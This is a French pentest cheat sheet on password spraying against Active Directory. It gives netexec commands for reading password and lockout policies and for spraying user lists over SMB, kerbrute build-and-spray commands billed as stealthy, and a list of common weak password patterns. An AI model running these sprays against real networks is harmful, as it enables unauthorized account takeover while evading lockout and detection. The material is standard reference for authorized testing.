
> Quand on obtient un compte sur un Active Directory, la première chose à faire est toujours de récupérer la liste complète des utilisateurs.\
> Une fois qu'on l'a, on peut faire un password spray sur toute la liste des utilisateurs (on trouve très souvent d'autres comptes avec un mot de passe faible du type username=password, SaisonAnnée!, NomSociétéAnnée! ou même 123456).

# Politique de mot de passe

```bash
nxc smb 192.168.56.11 --pass-pol
nxc smb 192.168.56.11 -u '' -p '' --pass-pol
```

---
# Politique de verrouillage

```cmd
net accounts
```

Champs clés : `Lockout threshold` (tentatives avant blocage) et `Lockout observation window` (minutes avant réinitialisation du compteur).

> Règle : rester sous le seuil de lockout. Ex: seuil = 5 → max 3 tentatives par user.

---
# NTLM

```bash
nxc smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

Tester des mots de passes simples

```bash
nxc smb 192.168.56.11 -u users.txt -p 'Azerty123!'
```

Tenter des listes de mot de passe simples

```bash
nxc smb 192.168.56.11 -u users.txt -p passwords.txt
```

Parmi les types de mots de passe les plus communs (à adapter selon la password policy):

* Password=Username (souvent des comptes de service)
* Mot de passe par défaut utilisé par l'IT
* NomEntreprise2024!
* NomEntreprise75001
* Janvier2024
* Mardi15042025!!!
* Azerty123!
* Password123!
* Bonjour123\*
* 123456

# Kerberos

Kerberos AS-REQ avec kerbrute (furtif, 2 paquets UDP)

```bash
# Linux
sudo apt update && sudo apt install golang-go --fix-missing
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
go build -o kerbrute .
./kerbrute passwordspray -d corp.com ../users.txt 'Nexus123!' --dc 192.168.193.70
```

> Utilise uniquement AS-REQ/AS-REP -  moins de trafic que SMB, pas de connexion complète établie.
